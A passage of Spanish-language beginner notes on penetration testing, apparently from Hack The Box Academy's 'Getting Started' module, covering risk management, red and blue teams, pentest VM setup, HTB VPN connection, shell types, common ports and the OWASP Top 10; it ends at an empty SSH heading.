# Getting Started

La seguridad de la información (infosec) es un campo muy amplio. El campo ha crecido y evolucionado mucho en los últimos años. Ofrece muchas especializaciones, que incluyen pero no se limitan a:

+ Seguridad de red e infraestructura
+ Seguridad de la aplicación
+ Pruebas de seguridad
+ Auditoría de sistemas
+ Planificación de la Continuidad del Negocio
+ Forense digital
+ Detección y respuesta a incidentes

En pocas palabras, la seguridad de la información es la práctica de proteger los datos contra el acceso no autorizado, los cambios, el uso ilegal, la interrupción, etc. Los profesionales de la seguridad de la información también toman medidas para reducir el impacto general de cualquier incidente de este tipo.

Los datos pueden ser electrónicos o físicos y tangibles (por ejemplo, planos de diseño) o intangibles (conocimiento). Una frase común que surgirá muchas veces en nuestra carrera de seguridad informática es proteger la "confidencialidad, integridad y disponibilidad de los datos" o la tríada de la CIA.
___

## **PROCESO DE GESTION DE RIESGO**

La protección de datos debe centrarse en la implementación de políticas eficientes pero efectivas sin afectar negativamente las operaciones comerciales y la productividad de una organización. Para lograr esto, las organizaciones deben seguir un proceso denominado proceso de gestión de riesgos. Este proceso implica los siguientes cinco pasos: 

+ Identificacion de riesgo: Identificar los riesgos a los que está expuesta la empresa, tales como riesgos legales, ambientales, de mercado, regulatorios y de otro tipo. 

+ Analisis de riesgo: Analizar los riesgos para determinar su impacto y probabilidad. Los riesgos deben asignarse a las diversas políticas, procedimientos y procesos comerciales de la organización. 

+ Evaluacion de riesgo: Evaluar, clasificar y priorizar los riesgos. Luego, la organización debe decidir aceptar (inevitable), evitar (cambiar planes), controlar (mitigar) o transferir el riesgo (asegurar). 

+ Trato con el riesgo: Eliminar o contener los riesgos lo mejor posible. Esto se maneja interactuando directamente con las partes interesadas del sistema o proceso con el que está asociado el riesgo. 

+ Monitoriando el riesgo: Todos los riesgos deben ser monitoreados constantemente. Los riesgos deben ser monitoreados constantemente por cualquier cambio situacional que pueda cambiar su puntaje de impacto, es decir, de impacto bajo a medio o alto. 


Como se mencionó anteriormente, el principio básico de la seguridad de la información es la seguridad de la información, o mantener la CIA de datos y asegurarse de que no se vea comprometida de ninguna manera o forma cuando ocurre un incidente. Un incidente puede ser un desastre natural, un mal funcionamiento del sistema o un incidente de seguridad. 
___

### EQUIPO ROJO VS EQUIPO AZUL

En infosec, solemos escuchar los términos equipo rojo y equipo azul. En los términos más simples, el equipo rojo juega el papel de los atacantes, mientras que el equipo azul juega el papel de los defensores.

Los equipos rojos generalmente juegan un papel de adversario al ingresar a la organización para identificar cualquier debilidad potencial que los atacantes reales puedan utilizar para romper las defensas de la organización. La tarea más común en el lado del equipo rojo son las pruebas de penetración, la ingeniería social y otras técnicas ofensivas similares.

Por otro lado, el equipo azul constituye la mayoría de los trabajos de seguridad informática. Es responsable de fortalecer las defensas de la organización mediante el análisis de riesgos, la formulación de políticas, la respuesta a amenazas e incidentes y el uso efectivo de herramientas de seguridad y otras tareas similares. 
___
### ROL DE LOS PENTESTERS

Un asesor de seguridad (pentester de red, pentester de aplicaciones web, miembro del equipo rojo, etc.) ayuda a una organización a identificar riesgos en sus redes externas e internas. Estos riesgos pueden incluir vulnerabilidades de la red o de la aplicación web, exposición de datos confidenciales, configuraciones incorrectas o problemas que podrían causar daños a la reputación. Un buen probador puede trabajar con un cliente para identificar riesgos para su organización, proporcionar información sobre cómo reproducir estos riesgos y orientación sobre cómo mitigar o remediar los problemas identificados durante las pruebas. 

Las evaluaciones pueden tomar muchas formas, desde una prueba de penetración de caja blanca contra todos los sistemas y aplicaciones en el alcance para identificar tantas vulnerabilidades como sea posible, hasta una evaluación de phishing para evaluar el riesgo o la conciencia de seguridad de los empleados, hasta una evaluación de equipo rojo específica construida alrededor de un escenario para emular a un actor de amenazas del mundo real.

Debemos comprender el panorama general de los riesgos que enfrenta una organización y su entorno para evaluar y calificar con precisión las vulnerabilidades descubiertas durante las pruebas. Una comprensión profunda del proceso de gestión de riesgos es fundamental para cualquier persona que se inicie en la seguridad de la información.

Este módulo se centrará en cómo iniciarse en la seguridad de la información y las pruebas de penetración desde una perspectiva práctica, específicamente seleccionando y navegando por una distribución de pentest, aprendiendo sobre tecnologías comunes y herramientas esenciales, aprendiendo los niveles y los conceptos básicos de las pruebas de penetración, descifrando nuestro primer box en HTB, cómo encontrar y pedir ayuda de manera más efectiva, posibles problemas comunes y cómo navegar por la plataforma Hack the Box.

Si bien este módulo utiliza la plataforma Hack The Box y máquinas vulnerables a propósito como ejemplos, las habilidades fundamentales mostradas se aplican a cualquier entorno. 
___

## **PRIMEROS PASOS CON DISTRIBUCION PENTES**

Cualquiera que busque iniciar un camino técnico en seguridad de la información debe sentirse cómodo con una amplia gama de tecnologías y sistemas operativos. Como pentesters, debemos comprender cómo configurar, mantener y proteger las máquinas de ataque Linux y Windows. Según el entorno del cliente o el alcance de la evaluación, es posible que utilicemos una máquina virtual Linux o Windows en nuestra máquina, nuestro sistema operativo base, una caja de Linux en la nube, una máquina virtual instalada dentro del entorno del cliente o incluso realizar pruebas directamente desde una estación de trabajo propia del cliente para simular una amenaza interna (suponiendo un escenario de ruptura). 
___

### ESCOGIENDO DISTRIBUCION

Hay muchas distribuciones de Linux (distros) para pruebas de penetración. Hay bastantes distribuciones preexistentes basadas en Debian precargadas con muchas herramientas que necesitamos para realizar nuestras evaluaciones. Muchas de estas herramientas rara vez se requieren y ninguna distribución contiene todas las herramientas que necesitamos para realizar nuestras evaluaciones. A medida que aprendemos y progresamos en nuestras carreras, gravitaremos hacia herramientas específicas y tendremos una lista de "imprescindibles" para agregar a una nueva distribución. A medida que avanzamos, es posible que incluso prefiramos personalizar completamente nuestra propia VM de pentesting a partir de una imagen base de Debian o Ubuntu, pero la creación de una VM totalmente personalizada está fuera del alcance de este módulo.

La elección de una distro es individual, y como hemos dicho, incluso podemos optar por crear y mantener la nuestra propia desde cero. Existen innumerables distribuciones de Linux que sirven para varios propósitos, algunas personalizadas explícitamente para pruebas de penetración, otras orientadas a pruebas de penetración de aplicaciones web, análisis forense, etc.

Esta sección cubrirá la configuración y el trabajo con [Parrot OS](https://parrotlinux.org/). Esta distro se utiliza para el Pwnbox que veremos a lo largo de Academy, personalizado para practicar y resolver ejercicios a lo largo de los distintos módulos que encontraremos. 

Es importante tener en cuenta que cada prueba de penetración o evaluación de seguridad se debe realizar desde una máquina virtual recién instalada para evitar incluir detalles relevantes para la seguridad de otro entorno de cliente en nuestros informes por accidente o retener datos confidenciales del cliente durante períodos de tiempo significativos. Por esta razón, debemos tener la capacidad de instalar rápidamente una nueva máquina de pentest y tener procesos implementados (automatización, scripts, procedimientos detallados, etc.) para configurar rápidamente nuestra(s) distribución(es) de elección para cada evaluación que realizamos. 
___
### CONFIGURANDO DISTRO DE PENTEST

Hay muchas maneras de configurar nuestra distribución de pentest local. Podemos instalarlo como nuestro sistema operativo base (aunque no se recomienda), configurar nuestra estación de trabajo para un arranque dual (que requiere mucho tiempo para alternar entre sistemas operativos) o instalar mediante virtualización.

Tenemos bastantes opciones disponibles: Hyper-V en Windows, como máquinas virtuales en hipervisores bare metal como Proxmox o VMware ESXi o usando hipervisores gratuitos como VirtualBox o VMware Workstation Player, que se pueden instalar y usar como hipervisores. en los sistemas operativos Windows y Linux.
Otra opción es VMware Workstation, que requiere una licencia paga pero ofrece muchas más funciones que las opciones gratuitas. 

Un hipervisor es un software que nos permite crear y ejecutar máquinas virtuales (VM). Nos permitirá usar nuestra computadora host (de escritorio o portátil) para ejecutar varias máquinas virtuales compartiendo virtualmente la memoria y los recursos de procesamiento.
Las máquinas virtuales en un hipervisor se ejecutan aisladas del sistema operativo principal, lo que ofrece una capa de aislamiento y protección entre nuestra red de producción y las redes vulnerables, como Hack The Box, o cuando se conecta a entornos cliente desde una máquina virtual (aunque surgen vulnerabilidades de ruptura de máquinas virtuales). de vez en cuando). 

Dependiendo de la cantidad de recursos que tenga nuestro sistema host (es decir, RAM), generalmente podemos ejecutar algunas máquinas virtuales a la vez. A menudo, es útil poner en marcha una VM durante una evaluación para probar un exploit o intentar recrear una aplicación como objetivo y máquinas levantadas en un entorno de laboratorio para probar las últimas herramientas, exploits y técnicas. Todos los que trabajan en una función técnica de seguridad de la información deben sentirse cómodos trabajando con uno o más hipervisores y construyendo máquinas virtuales de manera competente tanto para el trabajo como para la práctica. 

Para tener éxito, debemos trabajar continuamente para perfeccionar nuestro oficio. Una excelente manera es configurar un laboratorio en el hogar para intentar reproducir vulnerabilidades, configurar aplicaciones y servicios vulnerables, ver los efectos de las recomendaciones de remediación y tener un lugar seguro para practicar nuevas técnicas de ataque/exploits. Podemos construir nuestro laboratorio en una computadora portátil o de escritorio vieja, pero preferiblemente usando un servidor para instalar un hipervisor completo. 

Para nuestros propósitos, usaremos una versión modificada de Parrot Security (Pwnbox), disponible aquí para construir una máquina virtual local. Podemos elegir dos formatos: 

+ Optical disc image (ISO)
+ Open Virtual Appliance (OVA)




### ISO

El archivo ISO es esencialmente solo un CD-ROM que se puede montar dentro de nuestro hipervisor de elección para construir la máquina virtual instalando el sistema operativo nosotros mismos. Una ISO nos brinda más espacio para la personalización, por ejemplo, distribución del teclado, configuración regional, cambio de entorno de escritorio, particiones personalizadas, etc. y, por lo tanto, un enfoque más granular al configurar nuestra máquina virtual de ataque. 



### OVA

El archivo OVA es un dispositivo virtual prediseñado que contiene un archivo XML OVF que especifica la configuración de hardware de la máquina virtual y un VMDK, que es el disco virtual en el que está instalado el sistema operativo. Un OVA está preconstruido y, por lo tanto, se puede implementar rápidamente para ponerse en marcha más rápido.

Una vez en funcionamiento, podemos comenzar a explorar el sistema operativo, familiarizarnos con las herramientas y realizar las personalizaciones deseadas. El equipo de Parrot Linux mantiene una variedad de documentación útil: 

___

### PRACTICANDO CON PARROT

Nos encontraremos con Parrot Linux en Academy. La versión en el navegador, o Pwnbox, está disponible en cualquier sección del módulo que requiera interacción con un host de destino en nuestro entorno de laboratorio. Haga clic en el botón Iniciar instancia a continuación y comience a familiarizarse con Pwnbox. Todas las secciones del módulo interactivo se pueden completar desde nuestra propia máquina virtual después de generar una imagen de Docker o generar un host de destino o múltiples hosts y descargar una clave VPN. El uso de Pwnbox no es un requisito, pero es útil porque todo el trabajo de Academy se puede completar dentro de nuestro navegador sin necesidad de ningún software de virtualización o recursos adicionales para ejecutar una máquina virtual.

Se puede acceder a las instancias de Docker sin necesidad de una conexión VPN independiente. Los hosts específicos (es decir, los objetivos de Active Directory) requieren acceso VPN si no se accede desde Pwnbox. Si este es el caso, aparecerá un botón para descargar una clave VPN después de generar el objetivo. Comenzaremos a trabajar con hosts de destino más adelante en este módulo. 

___

## **MANTENERSE ORGANIZADO**

Ya sea que estemos realizando evaluaciones de clientes, usando CTF, tomando un curso en Academy o en otro lugar, o usando Boxes/labs de HTB, la organización siempre es crucial. Es fundamental priorizar una documentación clara y precisa desde el principio. Esta habilidad nos beneficiará sin importar el camino que tomemos en seguridad de la información o incluso en otras carreras. 
___

### ESTRUCTURA DE CARPETAS

Al atacar una simple box, lab o cliente, debemos tener una estructura de carpetas clara en nuestra máquina de ataque para guardar datos tales como: información de alcance, datos de enumeración, evidencia de intentos de exploits, datos confidenciales como credenciales y otros datos obtenidos. durante el reconocimiento, la explotación y la posexplotación. Una estructura de carpetas de muestra puede tener el siguiente aspecto: 
~~~
$tree Projects/

Projects/
└── Acme Company
    ├── EPT
    │   ├── evidence
    │   │   ├── credentials
    │   │   ├── data
    │   │   └── screenshots
    │   ├── logs
    │   ├── scans
    │   ├── scope
    │   └── tools
    └── IPT
        ├── evidence
        │   ├── credentials
        │   ├── data
        │   └── screenshots
        ├── logs
        ├── scans
        ├── scope
        └── tools
~~~
Aquí tenemos una carpeta para el cliente Acme Company con dos evaluaciones, Prueba de Penetración Interna (IPT) y Prueba de Penetración Externa (EPT). Debajo de cada carpeta, tenemos subcarpetas para guardar datos de escaneo, cualquier herramienta relevante, salida de registro, información de alcance (es decir, listas de IP/redes para alimentar nuestras herramientas de escaneo) y una carpeta de evidencia que puede contener cualquier credencial recuperada durante la evaluación. , cualquier dato relevante recuperado, así como capturas de pantalla. 

Es una preferencia personal, pero algunas personas crean una carpeta para cada host de destino y guardan capturas de pantalla dentro de ella. Otros organizan sus notas por host o red y guardan capturas de pantalla directamente en la herramienta para tomar notas. Experimente con estructuras de carpetas y vea qué funciona mejor para mantenerse organizado y trabajar de manera más eficiente. 

___

### HERRAMIENTAS PARA TOMAR NOTAS

La productividad y la organización son muy importantes. Un pentester muy técnico pero desorganizado tendrá dificultades para tener éxito en esta industria. Se pueden utilizar varias herramientas para la organización y la toma de notas. Seleccionar una herramienta para tomar notas es muy individual. Es posible que algunos de nosotros no necesitemos una característica que otra persona requiere en función de su flujo de trabajo. Algunas excelentes opciones para explorar incluyen: 

+ [Cherrytree](https://www.giuspen.com/cherrytree)
+ [Visual Studio Code](https://code.visualstudio.com/)
+ [Evernote](https://evernote.com/)
+ [Notion](https://www.notion.so/)
+ [GitBook](https://www.gitbook.com/)
+ [Sublime Text](https://www.sublimetext.com/)
+ [Notepad++](https://notepad-plus-plus.org/downloads)

Algunos de estos están más enfocados en la toma de notas, mientras que otros, como Notion y GitBook, tienen características más ricas que se pueden usar para crear páginas de tipo Wiki, hojas de trucos y más. Es importante asegurarse de que los datos de los clientes solo se almacenen localmente y no se sincronicen con la nube si se utiliza una de estas herramientas en evaluaciones del mundo real. 
~~~
Sugerencia: aprender el lenguaje Markdown es fácil y muy útil para tomar notas, ya que se puede representar fácilmente de una manera organizada y visualmente atractiva. 
~~~

___


### OTRAS HERRAMIENTAS Y SUGERENCIAS

Cada profesional de seguridad de la información debe mantener una base de conocimientos. Puede tener el formato que elija (aunque se recomiendan las herramientas anteriores). Esta base de conocimientos debe contener guías de referencia rápida para las tareas de configuración que realizamos en la mayoría de las evaluaciones y cheat sheets para los comandos comunes que usamos en cada fase de una evaluación. .

A medida que completamos box, labs, evaluaciones, cursos de capacitación, etc., debemos agregar cada carga útil, comando, sugerencia, ya que nunca sabemos cuándo puede ser útil. Tenerlos accesibles aumentará nuestra eficiencia y productividad en general. Cada módulo de HTB Academy tiene una hoja de trucos con los comandos relevantes que se muestran en las secciones del módulo, que puede descargar y conservar para futuras consultas. 

También debemos mantener checklist, plantillas de informes para varios tipos de evaluación y crear una base de datos de hallazgos/vulnerabilidad. Esta base de datos puede tomar la forma de una hoja de cálculo o algo más complejo e incluir un título de hallazgo, descripción, impacto, consejos de remediación y referencias. Tener estos hallazgos ya escritos nos ahorrará un tiempo considerable y reelaboración durante la fase de informes, ya que la mayor parte de los hallazgos ya estarán escritos y probablemente solo requieran cierta personalización para el entorno de destino. 
___

## **CONECTARSE USANDO VPN**

Una red privada virtual (VPN) nos permite conectarnos a una red privada (interna) y acceder a hosts y recursos como si estuviéramos conectados directamente a la red privada de destino. Es un canal de comunicaciones seguro sobre redes públicas compartidas para conectarse a una red privada (es decir, un empleado que se conecta de forma remota a la red corporativa de su empresa desde su hogar). Las VPN brindan un grado de privacidad y seguridad al cifrar las comunicaciones a través del canal para evitar las escuchas y el acceso a los datos que atraviesan el canal. 

En un nivel alto, la VPN funciona enrutando la conexión a Internet de nuestro dispositivo de conexión a través del servidor privado de la VPN de destino en lugar de nuestro proveedor de servicios de Internet (ISP). Cuando se conecta a una VPN, los datos se originan en el servidor VPN en lugar de en nuestra computadora y parecerá que se originan en una dirección IP pública que no es la nuestra.

Hay dos tipos principales de VPN de acceso remoto: VPN basada en cliente y VPN SSL. SSL VPN utiliza el navegador web como cliente VPN. La conexión se establece entre el navegador y una puerta de enlace SSL VPN y se puede configurar para permitir el acceso únicamente a aplicaciones basadas en la web, como sitios de correo electrónico e intranet, o incluso a la red interna, pero sin la necesidad de que el usuario final instale o use ningun software especializado. La VPN basada en cliente requiere el uso de software de cliente para establecer la conexión VPN. Una vez conectado, el host del usuario funcionará principalmente como si estuviera conectado directamente a la red de la empresa y podrá acceder a cualquier recurso (aplicaciones, hosts, subredes, etc.) permitido por la configuración del servidor. Algunas VPN corporativas brindarán a los empleados acceso completo a la red corporativa interna, mientras que otras colocarán a los usuarios en un segmento específico reservado para trabajadores remotos. 
___


### ¿POR QUE USAR VPN?

Podemos usar un servicio VPN como NordVPN o Private Internet Access y conectarnos a un servidor VPN en otra parte de nuestro país o en otra región del mundo para ocultar nuestro tráfico de navegación o disfrazar nuestra dirección IP pública. Esto puede proporcionarnos cierto nivel de seguridad y privacidad. Aún así, dado que nos estamos conectando al servidor de una empresa, siempre existe la posibilidad de que se registren datos o que el servicio VPN no siga las mejores prácticas de seguridad o las características de seguridad que anuncian. El uso de un servicio VPN conlleva el riesgo de que el proveedor no haga lo que dice y registre todos los datos. El uso de un servicio VPN no garantiza el anonimato ni la privacidad, pero es útil para eludir ciertas restricciones de red/cortafuegos o cuando se conecta a una posible red hostil (es decir, una red inalámbrica pública del aeropuerto). Nunca se debe usar un servicio VPN con la idea de que nos protegerá de las consecuencias de realizar actividades nefastas. 
___

### CONECTAR A VPN HTB

HTB y otros servicios que ofrecen VM/redes vulnerables a propósito requieren que los jugadores se conecten a la red de destino a través de una VPN para acceder a la red del laboratorio privado. Los hosts dentro de las redes HTB no pueden conectarse directamente a Internet. Cuando nos conectamos a HTB VPN (o cualquier laboratorio de pruebas de penetración/piratería), siempre debemos considerar que la red es "hostil". Solo debemos conectarnos desde una máquina virtual, deshabilitar la autenticación de contraseña si SSH está habilitado en nuestra VM atacante, bloquear cualquier servidor web y no dejar información confidencial en nuestra VM de ataque (es decir, no usar HTB u otras redes vulnerables con la misma VM que utilizamos para realizar evaluaciones de clientes). Al conectarnos a una VPN (ya sea dentro de HTB Academy o la plataforma principal de HTB), nos conectamos usando el siguiente comando: 
~~~
$ sudo openvpn user.ovpn

Thu Dec 10 18:42:41 2020 OpenVPN 2.4.9 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 21 2020
Thu Dec 10 18:42:41 2020 library versions: OpenSSL 1.1.1g  21 Apr 2020, LZO 2.10
Thu Dec 10 18:42:41 2020 Outgoing Control Channel Authentication: Using 256 bit message hash 'SHA256' for HMAC authentication
Thu Dec 10 18:42:41 2020 Incoming Control Channel Authentication: Using 256 bit message hash 'SHA256' for HMAC authentication
Thu Dec 10 18:42:41 2020 TCP/UDP: Preserving recently used remote address: [AF_INET]
Thu Dec 10 18:42:41 2020 Socket Buffers: R=[212992->212992] S=[212992->212992]
Thu Dec 10 18:42:41 2020 UDP link local: (not bound)
<SNIP>
Thu Dec 10 18:42:41 2020 Initialization Sequence Completed
~~~

La última línea Initialization Sequence Completed nos dice que nos conectamos con éxito a la VPN. 

Donde sudo le dice a nuestro host que ejecute el comando como usuario root elevado, openvpn es el cliente VPN y el archivo user.ovpn es la clave VPN que descargamos desde la sección del módulo Academy o la página principal de acceso a la plataforma HTB. Si escribimos ifconfig en otra ventana de terminal, veremos un adaptador tun si nos conectamos con éxito a la VPN. 
~~~
$ ifconfig

<SNIP>

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.x.2  netmask 255.255.254.0  destination 10.10.x.2
        inet6 dead:beef:1::2000  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::d82f:301a:a94a:8723  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen
~~~
Escribir netstat -rn nos mostrará las redes accesibles a través de la VPN. 

~~~
$netstat -rn

Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
0.0.0.0         192.168.1.2     0.0.0.0         UG        0 0          0 eth0
10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
192.168.1.0     0.0.0.0         255.255.255.0   U         0 0          0 eth0
~~~
Aquí puede ver que se puede acceder a la red 10.129.0.0/16 utilizada para las máquinas HTB Academy a través del adaptador tun0 a través de la red 10.10.14.0/23. 
___

## **TERMINOS COMUNES**

Las pruebas de penetración/hacking son un campo enorme. Nos encontraremos con innumerables tecnologías a lo largo de nuestras carreras. Estos son algunos de los términos y tecnologías más comunes con los que nos encontraremos repetidamente y que debemos dominar con firmeza. Esta no es una lista exhaustiva, pero es suficiente para comenzar con módulos fundamentales y boxes HTB fáciles. 
___

### SHELL

Shell es un término muy común que escucharemos una y otra vez durante nuestro viaje. Tiene algunos significados. En un sistema Linux, el shell es un programa que recibe información del usuario a través del teclado y pasa estos comandos al sistema operativo para realizar una función específica. En los primeros días de la informática, el shell era la única interfaz disponible para interactuar con los sistemas. Desde entonces, han surgido muchos más tipos y versiones de sistemas operativos junto con la interfaz gráfica de usuario (GUI) para complementar las interfaces de línea de comandos (shell), como la terminal de Linux, la línea de comandos de Windows (cmd.exe) y Windows PowerShell. . 

La mayoría de los sistemas Linux utilizan un programa llamado Bash (Bourne Again Shell) como programa shell para interactuar con el sistema operativo. Bash es una versión mejorada de sh, el programa shell original de los sistemas Unix. Además de bash, también hay otras shells, incluidas, entre otras, Zsh, Tcsh, Ksh, Fish shell, etc. 

A menudo leemos o escuchamos a otros hablar sobre "getting a shell" en una box (system). Esto significa que el host de destino ha sido explotado y hemos obtenido acceso a nivel de shell (generalmente bash o sh) y podemos ejecutar comandos de forma interactiva como si estuviéramos sentados conectados al host. Se puede obtener un shell explotando una aplicación web o una vulnerabilidad de red/servicio u obteniendo credenciales e iniciando sesión en el host de destino de forma remota. Hay tres tipos principales de conexiones de shell: 
~~~
Shell Type 	    Description
Reverse shell 	Inicia una conexión de regreso a un "listener" en nuestra box de ataque. 
		
Bind shell 	    "Binds" a un puerto específico en el host de destino y espera una conexión desde nuestra box de ataque. 
		
Web shell 	    Ejecuta comandos del sistema operativo a través del navegador web, normalmente no interactivo o semi-interactivo. 
                También se puede usar para ejecutar comandos únicos (es decir,aprovechar una vulnerabilidad de carga de archivos
                y cargar un script PHP para ejecutar un solo comando. 
~~~
Cada tipo de shell tiene su caso de uso, y de la misma manera que hay muchas formas de obtener un shell, el programa de ayuda que usamos para obtener un shell puede estar escrito en muchos lenguajes (Python, Perl, Go, Bash, Java, awk , PHP, etc). Estos pueden ser pequeños scripts o programas más grandes y complejos para facilitar una conexión desde el host de destino a nuestro sistema atacante y obtener acceso "shell". El acceso de Shell se discutirá en profundidad en una sección posterior.
___

### PORT (puerto)

Se puede pensar en un puerto como una ventana o puerta en una casa (la casa es un sistema remoto), si una ventana o puerta se deja abierta o no se bloquea correctamente, a menudo podemos obtener acceso no autorizado a una casa. Esto es similar en computación. Los puertos son puntos virtuales donde comienzan y terminan las conexiones de red. Están basados en software y son administrados por el sistema operativo host. Los puertos están asociados con un proceso o servicio específico y permiten que las computadoras diferencien entre diferentes tipos de tráfico (el tráfico SSH fluye a un puerto diferente al de las solicitudes web para acceder a un sitio web, aunque las solicitudes de acceso se envíen a través de la misma conexión de red). 


A cada puerto se le asigna un número y muchos están estandarizados en todos los dispositivos conectados a la red (aunque un servicio puede configurarse para ejecutarse en un puerto no estándar). Por ejemplo, los mensajes HTTP (tráfico del sitio web) generalmente van al puerto 80, mientras que los mensajes HTTPS van al puerto 443 a menos que se configure de otra manera. Encontraremos aplicaciones web que se ejecutan en puertos no estándar, pero generalmente las encontramos en los puertos 80 y 443. Los números de puerto nos permiten acceder a servicios o aplicaciones específicos que se ejecutan en dispositivos de destino. En un nivel muy alto, los puertos ayudan a las computadoras a comprender cómo manejar los distintos tipos de datos que reciben. 

Hay dos categorías de puertos, Protocolo de control de transmisión (TCP) y Protocolo de datagramas de usuario (UDP).
TCP está orientado a la conexión, lo que significa que se debe establecer una conexión entre un cliente y un servidor antes de poder enviar los datos. El servidor debe estar en estado de escucha esperando solicitudes de conexión de los clientes.
UDP utiliza un modelo de comunicación sin conexión. No hay "Handshake" y, por lo tanto, introduce cierta falta de confiabilidad ya que no hay garantía de entrega de datos. UDP es útil cuando la corrección/comprobación de errores no es necesaria o la propia aplicación la maneja. UDP es adecuado para aplicaciones que ejecutan tareas sensibles al tiempo, ya que descartar paquetes es más rápido que esperar paquetes retrasados debido a la retransmisión, como es el caso de TCP, y puede afectar significativamente un sistema en tiempo real. Hay 65535 puertos TCP y 65535 puertos UDP diferentes, cada uno indicado por un número. Algunos de los puertos TCP y UDP más conocidos se enumeran a continuación: 

| Puerto | Protocolo |
| -- | -- |
| 20/21 (TCP) | FTP |
| 22 (TCP) | SSH |
| 23 (TCP) | Telnet |
| 25 (TCP) | SMTP |
| 80 (TCP) | HTTP |
| 161 (TCP/UDP) | SNMP |
| 389 (TCP/UDP) | LDAP |
| 443 (TCP) | SSL/TLS (HTTPS) |
| 445 (TCP) | SMB |
| 3389 (TCP)| RDP |

Como profesionales de la seguridad de la información, debemos poder recordar rápidamente grandes cantidades de información sobre una amplia variedad de temas. Es esencial para nosotros, especialmente como pentesters, tener una comprensión firme de muchos puertos TCP y UDP y ser capaces de reconocerlos rápidamente solo por su número (es decir, saber que el puerto 21 es FTP, el puerto 80 es HTTP, el puerto 88 es Kerberos) sin tener que buscarlo. Esto vendrá con la práctica y la repetición y eventualmente se convertirá en una segunda naturaleza a medida que ataquemos más cajas, laboratorios y redes del mundo real nos ayudará a trabajar de manera más eficiente y priorizar mejor nuestros esfuerzos y ataques de enumeración. 

Guías como [esta](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html) y [esta](https://packetlife.net/media/library/23/common-ports.pdf) son excelentes recursos para aprender puertos TCP y UDP estándar y menos comunes. Ponte a prueba para memorizar tantos de estos como sea posible e investiga un poco sobre cada uno de los protocolos enumerados en la tabla anterior. Esta es una gran [referencia](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/) sobre los 1000 puertos TCP y UDP principales de nmap junto con los 100 servicios principales escaneados por nmap. 
___

### WEB SERVER

Un servidor web es una aplicación que se ejecuta en el servidor back-end, que maneja todo el tráfico HTTP desde el navegador del lado del cliente, lo enruta a las páginas de destino de las solicitudes y finalmente responde al navegador del lado del cliente. Los servidores web generalmente se ejecutan en los puertos TCP 80 o 443 y son responsables de conectar a los usuarios finales a varias partes de la aplicación web, además de manejar sus diversas respuestas

Como las aplicaciones web tienden a estar abiertas para la interacción pública y están orientadas a Internet, pueden comprometer el servidor de back-end si sufren alguna vulnerabilidad. Las aplicaciones web pueden proporcionar una amplia superficie de ataque, lo que las convierte en un objetivo de gran valor para los atacantes y los pentesters. 

Muchos tipos de vulnerabilidades pueden afectar a las aplicaciones web. A menudo oiremos o veremos referencias a [OWASP Top 10](https://owasp.org/www-project-top-ten/). Esta es una lista estandarizada de las 10 principales vulnerabilidades de aplicaciones web mantenidas por Open Web Application Security Project (OWASP). Esta lista se considera las 10 vulnerabilidades más peligrosas y no es una lista exhaustiva de todas las posibles vulnerabilidades de aplicaciones web. Las metodologías de evaluación de la seguridad de las aplicaciones web a menudo se basan en los 10 principales de OWASP como punto de partida para las principales categorías de fallas que un asesor debe verificar. La lista actual de OWASP Top 10 es: 

| Numero | Categoria | Descripcion |
| -- | -- | -- |
| 1. | Broken Access Control | Las restricciones no se implementan adecuadamente para evitar que los                       usuarios accedan a las cuentas de otros usuarios, vean datos confidenciales, accedan a funciones no autorizadas, modifiquen datos, etc. |
| 2. | Cryptographic Failures | Fallas relacionadas con la criptografía que a menudo conducen a la exposición de datos confidenciales o al compromiso del sistema. |
| 3. | Injection | Dato suministrado por usuario no es validado, filtrado u organizado por la aplicacion. Algunos ejemplos de inyecciones son inyección SQL, inyección de comando, inyección LDAP, etc. |
| 4. | Insecure Design | Estos problemas ocurren cuando la aplicación no está diseñada teniendo en cuenta la seguridad. |
| 5. | Security Misconfiguration | Falta de refuerzo de seguridad adecuado en cualquier parte de la aplication stack, configuraciones predeterminadas inseguras, almacenamiento en la nube abierto, mensajes de error detallados que revelan demasiada información. | 
| 6. | Vulnerable and Outdated Components | Usar componentes (tanto del lado del cliente como del lado del servidor) que son vulnerables, no compatibles o desactualizados. |
| 7. | Identification and Authentication Failures | Ataques relacionados con la autenticación que se dirigen a la identificacion, la autenticación y la gestión de sesiones del usuario |
| 8. | Software and Data Integrity Failures | Las fallas en la integridad del software y los datos se relacionan con el código y la infraestructura que no protegen contra las violaciones de la integridad. Un ejemplo de esto es cuando una aplicación se basa en complementos, bibliotecas o módulos de fuentes, repositorios y redes de entrega de contenido (CDN) que no son de confianza |
| 9. | Security Logging and Monitoring Failures | Esta categoría es para ayudar a detectar, escalar y responder a infracciones activas. Sin registro y monitoreo, las infracciones no se pueden detectar.|
| 10. | Server-Side Request Forgery | Las fallas de SSRF ocurren cada vez que una aplicación web obtiene un recurso remoto sin validar la URL proporcionada por el usuario. Permite a un atacante obligar a la aplicación a enviar una solicitud manipulada a un destino inesperado, incluso cuando está protegida por un firewall, VPN u otro tipo de lista de control de acceso a la red (ACL). | 


Es esencial familiarizarse con cada una de estas categorías y las diversas vulnerabilidades que se ajustan a cada una. Las vulnerabilidades de las aplicaciones web se tratarán en profundidad en módulos posteriores. Para obtener más información sobre las aplicaciones web, consulte el módulo Introducción a las aplicaciones web. 
___
## **HERRAMIENTAS BASICAS**

Herramientas como SSH, Netcat, Tmux y Vim son esenciales y la mayoría de los profesionales de la seguridad de la información las utilizan a diario. Aunque estas herramientas no pretenden ser herramientas de prueba de penetración, son fundamentales para el proceso de prueba de penetración, por lo que debemos dominarlas. 
___
### USANDO SSH

